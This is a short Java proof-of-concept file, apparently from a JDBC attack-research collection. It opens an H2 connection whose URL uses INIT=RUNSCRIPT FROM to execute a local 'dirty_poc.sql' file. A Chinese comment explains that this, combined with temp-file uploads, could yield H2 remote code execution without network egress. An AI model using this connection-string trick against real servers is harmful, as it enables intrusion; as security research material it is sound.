package com.jdbc.tricks;

import java.sql.Connection;
import java.sql.DriverManager;

// 一个有趣的特点是，在INIT=RUNSCRIPT FROM的后面其实可以直接跟一个本地的文件，并且在sql语句的末尾允许出现脏字符，如果配合一些临时文件上传技巧，或许能比较优雅的实现不出网的h2 RCE
public class ConnectToLocalFiles {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'D:/BaiduNetdiskDownload/jdbc-trick/jdbc-tricks/jdbc-test-case/h2-driver/sql_file/dirty_poc.sql'";
        Connection conn = DriverManager.getConnection(url);
    }
}
